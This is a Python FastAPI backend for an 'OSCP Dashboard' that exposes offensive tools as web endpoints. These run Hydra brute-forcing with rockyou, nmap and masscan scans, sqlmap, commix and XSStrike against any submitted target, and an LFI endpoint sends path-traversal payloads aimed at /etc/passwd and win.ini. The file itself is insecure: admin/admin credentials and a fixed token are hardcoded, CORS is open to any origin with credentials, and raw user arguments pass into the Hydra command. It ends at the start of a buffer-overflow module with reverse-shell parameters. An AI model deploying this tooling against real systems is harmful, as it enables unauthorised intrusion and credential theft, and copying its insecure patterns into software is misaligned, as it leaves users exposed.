# ══════════════════════════════════════════════════════════════
#  OSCP DASHBOARD — COMPLETE BACKEND
#  Run: python3 -m uvicorn main:app --host 0.0.0.0 --port 8000 --reload
# ══════════════════════════════════════════════════════════════

from fastapi import FastAPI, Depends, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from pydantic import BaseModel
from typing import Optional, List
import subprocess, asyncio, re, json, uuid, datetime, os
from urllib.parse import urlparse

app = FastAPI(title="OSCP Dashboard API")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

security = HTTPBearer(auto_error=False)
SECRET_TOKEN = "oscp-dashboard-token"

async def verify_token(credentials: HTTPAuthorizationCredentials = Depends(security)):
    if not credentials or credentials.credentials != SECRET_TOKEN:
        raise HTTPException(status_code=401, detail="Invalid token")
    return credentials.credentials

class ScanRequest(BaseModel):
    target: str

SCAN_HISTORY = []

def save_scan(scan_id, tool, target, result):
    SCAN_HISTORY.append({
        "id": scan_id, "tool": tool, "target": target,
        "timestamp": datetime.datetime.utcnow().isoformat(),
        "summary": result.get("output","")[:200]
    })
    if len(SCAN_HISTORY) > 200:
        SCAN_HISTORY.pop(0)

async def run_tool(cmd, timeout=60):
    cmd_str = " ".join(str(c) for c in cmd)
    try:
        proc = await asyncio.create_subprocess_exec(
            *[str(c) for c in cmd],
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
        )
        try:
            out, _ = await asyncio.wait_for(proc.communicate(), timeout=timeout)
            return {"output": out.decode("utf-8", errors="replace"), "cmd": cmd_str}
        except asyncio.TimeoutError:
            try: proc.kill()
            except: pass
            return {"output": f"[Timeout after {timeout}s]", "cmd": cmd_str, "error": "timeout"}
    except Exception as e:
        return {"output": "", "cmd": cmd_str, "error": str(e)}


# ── HEALTH ───────────────────────────────────────────────────
class LoginRequest(BaseModel):
    username: str
    password: str

@app.post("/api/auth/login")
async def login(req: LoginRequest):
    if req.username == "admin" and req.password == "admin":
        return {"access_token": "oscp-dashboard-token", "role": "admin", "username": req.username, "plan": "pro"}
    raise HTTPException(status_code=401, detail="Invalid credentials")

@app.get("/api/health")
async def health():
    tools = ["nmap","masscan","nikto","gobuster","dirb","hydra","sqlmap",
             "wafw00f","whatweb","dnsrecon","whois","amass","theharvester",
             "tcpdump","hping3","commix","curl","wget","dnschef"]
    free_tools = {}
    for tool in tools:
        result = await run_tool(["which", tool], timeout=5)
        free_tools[tool] = {"available": bool(result.get("output","").strip()), "cost": "FREE"}
    return {
        "status": "ok",
        "version": "2.0.0",
        "free_tools": free_tools,
        "timestamp": datetime.datetime.utcnow().isoformat()
    }

@app.post("/api/tools/status")
@app.get("/api/tools/status")
async def tools_status(user=Depends(verify_token)):
    tools = ["nmap","masscan","nikto","gobuster","dirb","hydra","sqlmap",
             "wafw00f","whatweb","dnsrecon","whois","amass","theharvester",
             "tcpdump","hping3","commix","curl","wget"]
    status = {}
    for tool in tools:
        result = await run_tool(["which", tool], timeout=5)
        status[tool] = "installed" if result.get("output","").strip() else "missing"
    return {"status": status, "timestamp": datetime.datetime.utcnow().isoformat()}

@app.get("/api/history")
async def get_history(user=Depends(verify_token)):
    return {"history": list(reversed(SCAN_HISTORY))}

@app.get("/api/scans")
async def get_scans(user=Depends(verify_token)):
    scans = list(reversed(SCAN_HISTORY))
    return {"scans": scans, "total": len(scans)}


# ── PASSWORD ATTACKS — HYDRA ──────────────────────────────────
class HydraRequest(BaseModel):
    target:   str
    service:  str = "http-post-form"
    username: str = ""
    userlist: str = ""
    passlist: str = "/usr/share/wordlists/rockyou.txt"
    port:     str = ""
    extra:    str = ""

@app.post("/api/password/hydra")
async def password_hydra(req: HydraRequest, user=Depends(verify_token)):
    cmd = ["hydra"]
    if req.username:
        cmd += ["-l", req.username]
    elif req.userlist:
        cmd += ["-L", req.userlist]
    else:
        cmd += ["-l", "admin"]
    cmd += ["-P", req.passlist]
    if req.port:
        cmd += ["-s", req.port]
    cmd += ["-t", "4", "-f", "-V"]
    if req.extra:
        cmd += req.extra.split()
    parsed = urlparse(req.target if req.target.startswith("http") else "http://"+req.target)
    host = parsed.hostname or req.target
    cmd += [host, req.service]
    result = await run_tool(cmd, timeout=300)
    out = result.get("output","")
    found = []
    for line in out.splitlines():
        if "[" in line and "] login:" in line.lower():
            found.append(line.strip())
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "hydra", req.target, result)
    return {
        "scan_id": scan_id, "target": req.target, "service": req.service,
        "credentials_found": found, "total": len(found),
        "raw_output": out, "command": result.get("cmd",""),
        "timestamp": datetime.datetime.utcnow().isoformat()
    }


# ══════════════════════════════════════════════════════════════
#  RECON MODULE
# ══════════════════════════════════════════════════════════════

def _recon_host(target: str) -> str:
    t = target.strip()
    if t.startswith("http://") or t.startswith("https://"):
        return urlparse(t).hostname or t
    return t.split("/")[0].strip()


@app.post("/api/recon/whois")
async def recon_whois(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    result = await run_tool(["whois", host], timeout=30)
    out = result.get("output","")
    def _get(patterns, text):
        for p in patterns:
            m = re.search(p, text, re.IGNORECASE | re.MULTILINE)
            if m: return m.group(1).strip()
        return None
    registrar   = _get([r"Registrar:\s*(.+)", r"registrar:\s*(.+)"], out)
    created     = _get([r"Creation Date:\s*(.+)", r"Created:\s*(.+)", r"created:\s*(.+)"], out)
    expires     = _get([r"Expiry Date:\s*(.+)", r"Registry Expiry Date:\s*(.+)", r"expires:\s*(.+)"], out)
    updated     = _get([r"Updated Date:\s*(.+)", r"last-modified:\s*(.+)"], out)
    registrant  = _get([r"Registrant Name:\s*(.+)", r"Registrant Organization:\s*(.+)"], out)
    country     = _get([r"Registrant Country:\s*(.+)", r"country:\s*(.+)"], out)
    name_servers = re.findall(r"Name Server:\s*(.+)", out, re.IGNORECASE)
    name_servers = [ns.strip().lower() for ns in name_servers[:6]]
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "whois", req.target, result)
    return {
        "scan_id": scan_id, "target": req.target, "tool": "whois",
        "registrar": registrar, "created": created, "expires": expires,
        "updated": updated, "registrant": registrant, "country": country,
        "name_servers": name_servers, "raw_output": out,
        "timestamp": datetime.datetime.utcnow().isoformat()
    }


@app.post("/api/recon/nmap")
async def recon_nmap(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    result = await run_tool(["nmap", "-sV", "-sC", "-T4", "--open", "-p-", host], timeout=300)
    out = result.get("output","")
    ports = []
    for line in out.splitlines():
        m = re.match(r"(\d+)/(tcp|udp)\s+(\w+)\s+(.+)", line.strip())
        if m:
            port, proto, state, service = m.groups()
            parts = service.split(None, 1)
            svc_name = parts[0] if parts else service
            version  = parts[1] if len(parts)>1 else ""
            ports.append({"port":int(port),"proto":proto,"state":state,"service":svc_name,"version":version.strip()})
    banner = None
    bm = re.search(r"\|[_ ]\s*banner:\s*(.+)", out, re.IGNORECASE)
    if bm: banner = bm.group(1).strip()
    os_guess = None
    om = re.search(r"OS details?:\s*(.+)", out, re.IGNORECASE)
    if om: os_guess = om.group(1).strip()
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "nmap", req.target, result)
    return {
        "scan_id": scan_id, "target": req.target, "tool": "nmap",
        "ports": ports, "total_open": len(ports),
        "banner": banner, "os_guess": os_guess,
        "raw_output": out, "command": result.get("cmd",""),
        "timestamp": datetime.datetime.utcnow().isoformat()
    }


@app.post("/api/recon/masscan")
async def recon_masscan(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    result = await run_tool(["masscan", host, "-p1-65535", "--rate=1000", "--wait=2"], timeout=120)
    out = result.get("output","")
    ports = []
    for line in out.splitlines():
        m = re.search(r"Discovered open port (\d+)/(\w+) on (.+)", line)
        if m:
            ports.append({"port":int(m.group(1)),"proto":m.group(2),"host":m.group(3).strip()})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "masscan", req.target, result)
    return {
        "scan_id": scan_id, "target": req.target, "tool": "masscan",
        "ports": sorted(ports, key=lambda x:x["port"]),
        "total_open": len(ports), "raw_output": out,
        "timestamp": datetime.datetime.utcnow().isoformat()
    }


@app.post("/api/recon/dns")
async def recon_dns(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    result = await run_tool(["dnsrecon", "-d", host, "-t", "std"], timeout=60)
    out = result.get("output","")
    records = []
    for line in out.splitlines():
        line = line.strip()
        for rtype in ["A","AAAA","MX","NS","TXT","SOA","CNAME","PTR","SRV"]:
            pattern = rf"\[\*\]\s+{rtype}\s+(.+)"
            m = re.match(pattern, line, re.IGNORECASE)
            if m:
                records.append({"type":rtype,"value":m.group(1).strip()})
                break
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "dnsrecon", req.target, result)
    return {
        "scan_id": scan_id, "target": req.target, "tool": "dnsrecon",
        "records": records, "total": len(records), "raw_output": out,
        "timestamp": datetime.datetime.utcnow().isoformat()
    }


@app.post("/api/recon/subdomains")
async def recon_subdomains(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    result = await run_tool(["sublist3r", "-d", host, "-t", "5", "-o", "/dev/null"], timeout=120)
    out = result.get("output","")
    subdomains = []
    for line in out.splitlines():
        line = line.strip()
        if line and host in line and not line.startswith("[") and not line.startswith("-"):
            subdomains.append(line)
    subdomains = list(dict.fromkeys(subdomains))
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "sublist3r", req.target, result)
    return {
        "scan_id": scan_id, "target": req.target, "tool": "sublist3r",
        "subdomains": subdomains, "total": len(subdomains), "raw_output": out,
        "timestamp": datetime.datetime.utcnow().isoformat()
    }


@app.post("/api/recon/theharvester")
async def recon_theharvester(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    result = await run_tool(["theHarvester", "-d", host, "-b", "bing,crtsh,dnsdumpster", "-l", "100"], timeout=120)
    out = result.get("output","")
    emails = list(dict.fromkeys(re.findall(r"[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}", out)))
    hosts  = list(dict.fromkeys(re.findall(r"(?:\d{1,3}\.){3}\d{1,3}", out)))
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "theharvester", req.target, result)
    return {
        "scan_id": scan_id, "target": req.target, "tool": "theHarvester",
        "emails": emails, "hosts": hosts,
        "total_emails": len(emails), "total_hosts": len(hosts),
        "raw_output": out, "timestamp": datetime.datetime.utcnow().isoformat()
    }


@app.post("/api/recon/dirb")
async def recon_dirb(req: ScanRequest, user=Depends(verify_token)):
    result = await run_tool(["dirb", req.target, "/usr/share/wordlists/dirb/common.txt", "-S", "-r"], timeout=120)
    out = result.get("output","")
    found = []
    for line in out.splitlines():
        m = re.match(r"==> DIRECTORY:\s*(.+)|^\+\s+(https?://\S+)", line.strip())
        if m:
            url = (m.group(1) or m.group(2) or "").strip()
            if url: found.append(url)
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "dirb", req.target, result)
    return {
        "scan_id": scan_id, "target": req.target, "tool": "dirb",
        "found": found, "total": len(found), "raw_output": out,
        "timestamp": datetime.datetime.utcnow().isoformat()
    }


@app.post("/api/recon/gobuster")
async def recon_gobuster(req: ScanRequest, user=Depends(verify_token)):
    result = await run_tool(
        ["gobuster", "dir", "-u", req.target, "-w", "/usr/share/wordlists/dirb/common.txt",
         "-t", "20", "-q", "--no-progress"], timeout=120)
    out = result.get("output","")
    found = []
    for line in out.splitlines():
        m = re.match(r"(/\S+)\s+\(Status:\s*(\d+)\)", line.strip())
        if m: found.append({"path": m.group(1), "status": int(m.group(2))})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "gobuster", req.target, result)
    return {
        "scan_id": scan_id, "target": req.target, "tool": "gobuster",
        "found": found, "total": len(found), "raw_output": out,
        "timestamp": datetime.datetime.utcnow().isoformat()
    }


# ══════════════════════════════════════════════════════════════
#  VULNERABILITY SCANNING MODULE
# ══════════════════════════════════════════════════════════════

import urllib.request as _ureq, ssl as _ssl

def _sev(text):
    t = text.lower()
    if any(k in t for k in ["sql injection","remote code","command injection","rce","shell","arbitrary file","traversal","authentication bypass"]): return "CRITICAL"
    if any(k in t for k in ["xss","cross-site script","csrf","open redirect","admin","backup","config","password","credentials","privilege"]): return "HIGH"
    if any(k in t for k in ["header missing","content-security","x-frame","referrer","hsts","strict-transport","deprecated","information disclosure","version"]): return "MEDIUM"
    if any(k in t for k in ["clickjack","cookie","cache","options","banner","server","mime"]): return "LOW"
    return "MEDIUM"

def _rem(text):
    t = text.lower()
    if "content-security-policy" in t: return "Add Content-Security-Policy header"
    if "strict-transport" in t or "hsts" in t: return "Enable HSTS: Strict-Transport-Security header"
    if "referrer-policy" in t: return "Add Referrer-Policy header"
    if "x-content-type" in t: return "Add X-Content-Type-Options: nosniff header"
    if "x-frame" in t: return "Use Content-Security-Policy frame-ancestors instead of X-Frame-Options"
    if "permissions-policy" in t: return "Add Permissions-Policy header"
    if "sql" in t: return "Use parameterised queries / prepared statements"
    if "xss" in t: return "Sanitise and encode all user input; enforce CSP"
    if "csrf" in t: return "Implement CSRF tokens on all state-changing requests"
    if "admin" in t: return "Restrict admin paths by IP or require strong authentication"
    if "backup" in t or "config" in t: return "Remove backup/config files from web root"
    if "cookie" in t: return "Set Secure, HttpOnly, SameSite flags on cookies"
    return "Review and remediate according to OWASP guidelines"


@app.post("/api/scan/nikto")
async def scan_nikto(req: ScanRequest, user=Depends(verify_token)):
    result = await run_tool(["nikto", "-h", req.target, "-nointeractive"], timeout=120)
    out = result.get("output","")
    findings = []
    for line in out.splitlines():
        line = line.strip()
        if not line.startswith("+ "): continue
        if any(s in line for s in ["Target IP","Target Hostname","Target Port","Start Time","End Time","host(s) tested","Nikto v","requests:","No CGI Directories"]): continue
        detail = re.sub(r"^\+\s*\[\d+\]\s*","",line).strip().lstrip("+ ").strip()
        detail = re.sub(r"\s*See:\s*https?://\S+","",detail,flags=re.IGNORECASE).strip()
        if not detail or len(detail)<10: continue
        findings.append({"detail":detail,"severity":_sev(detail),"cvss":"0.0","cve":"N/A","cwe":"N/A","cwe_name":"Web Vulnerability","owasp":"A05:2021","remediation":_rem(detail)})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id,"nikto",req.target,result)
    return {"scan_id":scan_id,"target":req.target,"tool":"nikto","findings":findings,"total":len(findings),"raw_output":out,"command":result.get("cmd",""),"timestamp":datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/nmap_vuln")
async def scan_nmap_vuln(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    result = await run_tool(["nmap","--script","vuln","-T4",host], timeout=180)
    out = result.get("output","")
    findings = []
    current = None
    for line in out.splitlines():
        line = line.strip()
        m = re.match(r"\|\s*(CVE-[\d-]+).*?([\d.]+)\s*(.+)?", line)
        if m:
            cve,cvss,desc = m.group(1),m.group(2),(m.group(3) or "").strip()
            sev = "CRITICAL" if float(cvss)>=9 else "HIGH" if float(cvss)>=7 else "MEDIUM" if float(cvss)>=4 else "LOW"
            findings.append({"detail":f"{cve}: {desc}" if desc else cve,"severity":sev,"cvss":cvss,"cve":cve,"cwe":"N/A","cwe_name":"Network Vulnerability","owasp":"A06:2021","remediation":"Apply vendor patch for "+cve})
        elif "|_" in line and "VULNERABLE" in line.upper():
            findings.append({"detail":line.replace("|_","").strip(),"severity":"HIGH","cvss":"7.5","cve":"N/A","cwe":"N/A","cwe_name":"Network Vulnerability","owasp":"A06:2021","remediation":"Patch the vulnerable service"})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id,"nmap_vuln",req.target,result)
    return {"scan_id":scan_id,"target":req.target,"tool":"nmap_vuln","findings":findings,"total":len(findings),"raw_output":out,"command":result.get("cmd",""),"timestamp":datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/sqlmap")
async def scan_sqlmap(req: ScanRequest, user=Depends(verify_token)):
    result = await run_tool(["sqlmap","-u",req.target,"--batch","--level=2","--risk=1","--output-dir=/tmp/sqlmap_out","--forms","--crawl=2"], timeout=180)
    out = result.get("output","")
    findings = []
    vuln_params = re.findall(r"Parameter:\s*(.+?)\s+\(", out)
    for p in dict.fromkeys(vuln_params):
        findings.append({"detail":f"SQL Injection in parameter: {p}","severity":"CRITICAL","cvss":"9.8","cve":"N/A","cwe":"CWE-89","cwe_name":"SQL Injection","owasp":"A03:2021","remediation":"Use parameterised queries / prepared statements"})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id,"sqlmap",req.target,result)
    return {"scan_id":scan_id,"target":req.target,"tool":"sqlmap","findings":findings,"total":len(findings),"raw_output":out,"command":result.get("cmd",""),"timestamp":datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/headers")
async def scan_headers(req: ScanRequest, user=Depends(verify_token)):
    SECURITY_HEADERS = [
        ("content-security-policy","Content-Security-Policy","HIGH","CSP prevents XSS attacks"),
        ("strict-transport-security","HSTS","HIGH","Forces HTTPS connections"),
        ("x-content-type-options","X-Content-Type-Options","MEDIUM","Prevents MIME sniffing"),
        ("x-frame-options","X-Frame-Options","MEDIUM","Prevents clickjacking"),
        ("referrer-policy","Referrer-Policy","LOW","Controls referrer information"),
        ("permissions-policy","Permissions-Policy","LOW","Controls browser features"),
    ]
    findings = []
    headers_found = {}
    try:
        result = await run_tool(["curl","-sI","--max-time","10","-L",req.target], timeout=20)
        out = result.get("output","")
        for line in out.splitlines():
            if ":" in line:
                k,_,v = line.partition(":")
                headers_found[k.strip().lower()] = v.strip()
        for hdr_key, hdr_name, sev, desc in SECURITY_HEADERS:
            if hdr_key not in headers_found:
                findings.append({"detail":f"Missing {hdr_name} header — {desc}","severity":sev,"cvss":"5.3","cve":"N/A","cwe":"CWE-16","cwe_name":"Configuration","owasp":"A05:2021","remediation":_rem(hdr_name)})
    except Exception as e:
        findings.append({"detail":f"Scan error: {e}","severity":"INFO","cvss":"0.0","cve":"N/A","cwe":"N/A","cwe_name":"Scan Error","owasp":"N/A","remediation":"Check target"})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id,"headers",req.target,{"output":str(findings)})
    return {"scan_id":scan_id,"target":req.target,"tool":"headers","findings":findings,"total":len(findings),"headers_present":headers_found,"timestamp":datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/cookies")
async def scan_cookies(req: ScanRequest, user=Depends(verify_token)):
    findings = []
    cookies = []
    try:
        result = await run_tool(["curl","-sI","--max-time","10","-L",req.target], timeout=20)
        out = result.get("output","")
        for line in out.splitlines():
            if line.lower().startswith("set-cookie:"):
                cookie_val = line[11:].strip()
                cookie_name = cookie_val.split("=")[0].split(";")[0].strip()
                issues = []
                if "httponly" not in cookie_val.lower(): issues.append("Missing HttpOnly")
                if "secure" not in cookie_val.lower():   issues.append("Missing Secure flag")
                if "samesite" not in cookie_val.lower(): issues.append("Missing SameSite")
                score = max(0, 100 - len(issues)*30)
                cookies.append({"name":cookie_name,"cookie":cookie_val,"issues":issues,"secure_score":score})
                if issues:
                    findings.append({"detail":f"Cookie '{cookie_name}': {', '.join(issues)}","severity":"MEDIUM","cvss":"5.4","cve":"N/A","cwe":"CWE-614","cwe_name":"Sensitive Cookie","owasp":"A02:2021","remediation":"Set Secure, HttpOnly, SameSite=Strict on all session cookies"})
    except Exception as e:
        findings.append({"detail":f"Scan error: {e}","severity":"INFO","cvss":"0.0","cve":"N/A","cwe":"N/A","cwe_name":"Scan Error","owasp":"N/A","remediation":"Check target"})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id,"cookies",req.target,{"output":str(cookies)})
    return {"scan_id":scan_id,"target":req.target,"tool":"cookies","findings":findings,"cookies":cookies,"total":len(cookies),"timestamp":datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/ssl")
async def scan_ssl(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    result = await run_tool(["sslscan","--no-colour",host], timeout=60)
    out = result.get("output","")
    findings = []
    if re.search(r"SSLv[23]|TLSv1\.0|TLSv1\.1",out,re.IGNORECASE):
        findings.append({"detail":"Weak SSL/TLS protocol enabled (SSLv2/3 or TLS 1.0/1.1)","severity":"HIGH","cvss":"7.5","cve":"N/A","cwe":"CWE-326","cwe_name":"Weak Cryptography","owasp":"A02:2021","remediation":"Disable SSLv2, SSLv3, TLS 1.0, TLS 1.1. Use TLS 1.2+ only."})
    if re.search(r"RC4|DES|3DES|EXPORT|NULL|anon",out,re.IGNORECASE):
        findings.append({"detail":"Weak cipher suite detected (RC4/DES/EXPORT/NULL)","severity":"HIGH","cvss":"7.5","cve":"N/A","cwe":"CWE-327","cwe_name":"Broken Algorithm","owasp":"A02:2021","remediation":"Disable weak cipher suites. Use AES-GCM with perfect forward secrecy."})
    if "self-signed" in out.lower() or "untrusted" in out.lower():
        findings.append({"detail":"Self-signed or untrusted SSL certificate","severity":"MEDIUM","cvss":"5.3","cve":"N/A","cwe":"CWE-295","cwe_name":"Certificate Validation","owasp":"A02:2021","remediation":"Use a certificate from a trusted CA."})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id,"ssl",req.target,result)
    return {"scan_id":scan_id,"target":req.target,"tool":"sslscan","findings":findings,"total":len(findings),"raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/xss")
async def scan_xss(req: ScanRequest, user=Depends(verify_token)):
    result = await run_tool(["python3","/usr/share/xsstrike/xsstrike.py","-u",req.target,"--crawl","--blind","--skip-dom","-l","2"], timeout=120)
    out = result.get("output","")
    findings = []
    for line in out.splitlines():
        if "vulnerable" in line.lower() or "XSS" in line:
            findings.append({"detail":line.strip(),"severity":"HIGH","cvss":"7.4","cve":"N/A","cwe":"CWE-79","cwe_name":"Cross-Site Scripting","owasp":"A03:2021","remediation":"Sanitise and encode all user input; enforce Content-Security-Policy."})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id,"xss",req.target,result)
    return {"scan_id":scan_id,"target":req.target,"tool":"xsstrike","findings":findings,"total":len(findings),"raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/cms")
async def scan_cms(req: ScanRequest, user=Depends(verify_token)):
    result = await run_tool(["whatweb","--color=never","--no-errors","-a","3",req.target], timeout=60)
    out = result.get("output","")
    findings = []
    for kw,detail,sev in [
        ("WordPress","WordPress CMS detected — check for outdated plugins","HIGH"),
        ("Joomla","Joomla CMS detected — check for known CVEs","HIGH"),
        ("Drupal","Drupal CMS detected — Drupalgeddon vulnerabilities may apply","HIGH"),
        ("jQuery[1","Outdated jQuery version detected","MEDIUM"),
        ("Bootstrap[2","Outdated Bootstrap version","LOW"),
    ]:
        if kw.lower() in out.lower():
            findings.append({"detail":detail,"severity":sev,"cvss":"7.5" if sev=="HIGH" else "5.3","cve":"N/A","cwe":"CWE-1035","cwe_name":"Using Vulnerable Components","owasp":"A06:2021","remediation":"Update CMS and all plugins to latest versions."})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id,"cms",req.target,result)
    return {"scan_id":scan_id,"target":req.target,"tool":"whatweb","findings":findings,"total":len(findings),"raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/dirb")
async def scan_dirb(req: ScanRequest, user=Depends(verify_token)):
    result = await run_tool(["dirb",req.target,"/usr/share/wordlists/dirb/common.txt","-S","-r"], timeout=120)
    out = result.get("output","")
    found = []
    for line in out.splitlines():
        m = re.match(r"==> DIRECTORY:\s*(.+)|^\+\s+(https?://\S+)", line.strip())
        if m:
            url = (m.group(1) or m.group(2) or "").strip()
            if url: found.append(url)
    findings = [{"detail":f"Accessible path: {u}","severity":"LOW","cvss":"3.1","cve":"N/A","cwe":"CWE-538","cwe_name":"File Exposure","owasp":"A01:2021","remediation":"Restrict access to sensitive directories"} for u in found]
    scan_id = str(uuid.uuid4())
    save_scan(scan_id,"dirb",req.target,result)
    return {"scan_id":scan_id,"target":req.target,"tool":"dirb","findings":findings,"found":found,"total":len(found),"raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/nuclei")
async def nuclei_scan(req: ScanRequest, user=Depends(verify_token)):
    cmd = ["nuclei","-u",req.target,"-severity","critical,high,medium,low","-c","25","-timeout","10","-no-color","-jsonl"]
    result = await run_tool(cmd, timeout=300)
    findings = []
    CVSS_MAP = {"critical":"9.8","high":"7.5","medium":"5.3","low":"3.1"}
    for line in result["output"].split("\n"):
        line = line.strip()
        if not line: continue
        try:
            data = json.loads(line)
            info = data.get("info",{})
            sev  = info.get("severity","info").lower()
            cves = info.get("classification",{}).get("cve-id") or []
            cwes = info.get("classification",{}).get("cwe-id") or []
            findings.append({"detail":info.get("name","Nuclei Finding")+(f" — {data.get('matched-at','')}" if data.get("matched-at") else ""),"severity":sev.upper(),"cvss":CVSS_MAP.get(sev,"0.0"),"cve":cves[0] if cves else "N/A","cwe":cwes[0] if cwes else "N/A","cwe_name":"Security Vulnerability","owasp":"A05:2021","remediation":info.get("remediation") or "Apply patch or update the affected component."})
        except: pass
    scan_id = str(uuid.uuid4())
    save_scan(scan_id,"nuclei",req.target,result)
    return {"scan_id":scan_id,"target":req.target,"tool":"nuclei","findings":findings,"total":len(findings),"raw_output":result["output"],"timestamp":datetime.datetime.utcnow().isoformat()}


# ══════════════════════════════════════════════════════════════
#  ADDITIONAL SCAN ENDPOINTS (commix, lfi, csrf, idor, ssti)
# ══════════════════════════════════════════════════════════════

import requests as _req_lib
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


@app.post("/api/scan/commix")
async def commix_scan(req: ScanRequest, user=Depends(verify_token)):
    cmd = ["commix","--url",req.target,"--crawl=1","--batch","--level=1","--timeout=10","--output-dir=/tmp/commix_out"]
    result = await run_tool(cmd, timeout=180)
    out = result["output"].lower()
    vulnerable = ("is vulnerable" in out or "command injection" in out or "[+]" in result["output"] and "parameter" in out)
    findings = []
    if vulnerable:
        findings.append({"detail":"OS Command Injection vulnerability detected","severity":"CRITICAL","cvss":"9.8","cve":"N/A","cwe":"CWE-78","cwe_name":"OS Command Injection","owasp":"A03:2021","remediation":"Never pass user input to OS commands. Use safe APIs and input validation."})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id,"commix",req.target,result)
    return {"scan_id":scan_id,"target":req.target,"tool":"commix","vulnerable":vulnerable,"findings":findings,"total":len(findings),"raw_output":result["output"],"timestamp":datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/lfi")
async def lfi_scan(req: ScanRequest, user=Depends(verify_token)):
    payloads = ["../../../../etc/passwd","..%2F..%2F..%2F..%2Fetc%2Fpasswd","....//....//....//etc/passwd","../../../../windows/win.ini"]
    findings = []
    indicators = ["root:x:","bin:x:","[extensions]","for 16-bit"]
    for payload in payloads:
        test_url = req.target + payload if not req.target.endswith("/") else req.target + payload
        try:
            r = _req_lib.get(test_url, timeout=8, verify=False, allow_redirects=True)
            for ind in indicators:
                if ind in r.text:
                    findings.append({"detail":f"LFI confirmed: {payload} reveals {ind}","severity":"CRITICAL","cvss":"9.1","cve":"N/A","cwe":"CWE-22","cwe_name":"Path Traversal","owasp":"A01:2021","remediation":"Validate and sanitise all file path inputs. Use allowlists."})
                    break
        except: pass
    scan_id = str(uuid.uuid4())
    save_scan(scan_id,"lfi",req.target,{"output":str(findings)})
    return {"scan_id":scan_id,"target":req.target,"tool":"lfi","findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/csrf")
async def csrf_scan(req: ScanRequest, user=Depends(verify_token)):
    findings = []
    try:
        r = _req_lib.get(req.target,timeout=10,verify=False,headers={"User-Agent":"Mozilla/5.0"},allow_redirects=True)
        forms = re.findall(r"<form[^>]*?>.*?</form>",r.text,re.DOTALL|re.IGNORECASE)
        csrf_patterns = ["csrf","_token","token","authenticity_token","__requestverificationtoken","xsrf","nonce"]
        for i,form in enumerate(forms):
            has_csrf = any(p in form.lower() for p in csrf_patterns)
            m = re.search(r'method=["\'](\w+)["\']',form,re.IGNORECASE)
            method = m.group(1).upper() if m else "GET"
            am = re.search(r'action=["\']([^"\']*)["\']',form,re.IGNORECASE)
            action = am.group(1) if am else req.target
            if method in ("POST","PUT","DELETE") and not has_csrf:
                findings.append({"detail":f"CSRF: Form #{i+1} (action={action}) has no CSRF token","severity":"HIGH","cvss":"8.0","cve":"N/A","cwe":"CWE-352","cwe_name":"CSRF","owasp":"A01:2021","remediation":"Add CSRF tokens to all state-changing forms."})
        if not r.headers.get("Referrer-Policy"):
            findings.append({"detail":"Missing Referrer-Policy header","severity":"LOW","cvss":"3.1","cve":"N/A","cwe":"CWE-352","cwe_name":"CSRF","owasp":"A01:2021","remediation":"Add Referrer-Policy: strict-origin-when-cross-origin header."})
    except Exception as e:
        findings.append({"detail":f"CSRF scan error: {e}","severity":"INFO","cvss":"0.0","cve":"N/A","cwe":"N/A","cwe_name":"Scan Error","owasp":"N/A","remediation":"Check target accessibility."})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id,"csrf",req.target,{"output":str(findings)})
    return {"scan_id":scan_id,"target":req.target,"tool":"csrf","findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}


# ══════════════════════════════════════════════════════════════
#  BUFFER OVERFLOW MODULE
# ══════════════════════════════════════════════════════════════

import socket as _sock, struct as _struct, time as _time

class BOFRequest(BaseModel):
    target:       str
    prefix:       str  = ""
    fuzz_step:    int  = 100
    pattern_size: int  = 500
    eip_value:    str  = ""
    offset:       int  = 0
    bad_chars:    str  = "\\x00"
    jmp_esp:      str  = ""
    binary_path:  str  = "/home/kali/vulnserver"
    lhost:        str  = ""
    lport:        int  = 4444
